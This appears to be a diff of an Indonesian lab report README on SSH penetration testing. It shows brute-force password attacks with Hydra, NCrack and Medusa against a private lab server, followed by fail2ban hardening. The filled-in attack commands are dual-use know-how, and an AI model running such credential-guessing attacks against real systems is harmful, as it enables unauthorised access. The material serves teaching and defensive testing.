@@ -40,6 +40,8 @@
 
 #### Install SSH Server
 
+Pada instalasi ubuntu server, kami sudah meng include install openssh pada server. Namun untuk menginstall secara manual bisa menggunakan cara dibawah.
+
 1. Untuk install ssh server ketik
 ```
 sudo apt-get install openssh-server
@@ -49,7 +51,7 @@ sudo apt-get install openssh-server
 ```
 service ssh status
 ```
-![alt text](https://user-images.githubusercontent.com/17487644/32114550-0fdae0cc-bb6e-11e7-8987-bf3d03952e06.PNG)
+https://user-images.githubusercontent.com/17487644/32114550-0fdae0cc-bb6e-11e7-8987-bf3d03952e06.PNG
 #### Install Tools Medusa, THC-Hydra, NCrack
 
 1. THC-Hydra, NCrack, dan Medusa merupakan tools default Kali, sehingga tidak perlu install
@@ -61,24 +63,36 @@ service ssh status
 1. Hydra membutuhkan list password, maka dibuat file password bernama """""""
 1. Jalankan Hydra
 ```
-hydra -l [username] -P [text_password] [ip_target] -t [jumlah_thread] [tipe_protocol]
+hydra -l ubuntuserver -P '/root/Desktop/passw.txt' 192.168.1.8 -t 4 ssh
 ```
+![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/1hydra.PNG?raw=true)
 
 #### NCrack
 
 1. Jalankan NCrack
 
 ```
-ncrack -p [port] --user [username] -P [text_password] [ip_target] 
+ncrack -p 22 --user ubuntuserver -P '/root/Desktop/passw.txt' 192.168.1.8 
 ```
+![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/2-ncrack.PNG?raw=true)
 
 #### Medusa
 
 1. Jalankan Medusa
 
 ```
-medusa -u root -P list.txt -h 192.168.33.10 -M sshMedusa v2.2_rc3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net> 
+medusa -u ubuntuserver -P '/root/Desktop/passw.txt' -h 192.168.1.8 -M ssh 
 ```
+![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/med1.PNG?raw=true)
+![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/med2.PNG?raw=true)
+
+#### Uji Masuk SSH
+1. Masuk ke SSH
+
+```
+ssh ubuntuserver@192.168.1.8
+```
+![alt text](https://github.com/kevinfachreza/pksj/blob/master/pksj/no%20counter/coba%20masuk%20ssh%20server.PNG?raw=true)
 
 
 ## Uji Penetrasi 2
@@ -89,42 +103,27 @@ medusa -u root -P list.txt -h 192.168.33.10 -M sshMedusa v2.2_rc3 [http://www.fo
 sudo apt-get install fail2ban
 ```
 
-2. Install Ip-tables persistent
-
-```
-sudo apt-get install iptables-persistent
-```
-
-3. Buka konfigurasi fail2ban
+2. Buka konfigurasi fail2ban
 
 ```
 sudo nano /etc/fail2ban/jail.conf
 ```
 
-4. Atur bantime. Bantime merupakan lamanya waktu jika host di ban
-5. Atur maxretry. Max retry merupakan maksimal percobaan gagal
-6. Atur findtime. Findtime merupakan waktu diantara percobaan gagal 1 dan terakhir.
-7. Masukkan command berikut
+3. Atur bantime. Bantime merupakan lamanya waktu jika host di ban
+4. Atur maxretry. Max retry merupakan maksimal percobaan gagal
+5. Atur findtime. Findtime merupakan waktu diantara percobaan gagal 1 dan terakhir.
 
-```
-sudo iptables -A INPUT -i lo -j ACCEPT
-sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
-sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
-sudo iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT
-sudo iptables -A INPUT -j DROP
-```
-
-8. Cek Iptables
+6. Cek Iptables
 
 ```
 sudo iptables -S
 ```
 
-9. Start fail2ban
+7. Restart fail2ban
 
 ```
 sudo service fail2ban start
 ```
 
-10. Lihat perubahan iptables
+8. Lihat perubahan iptables
 
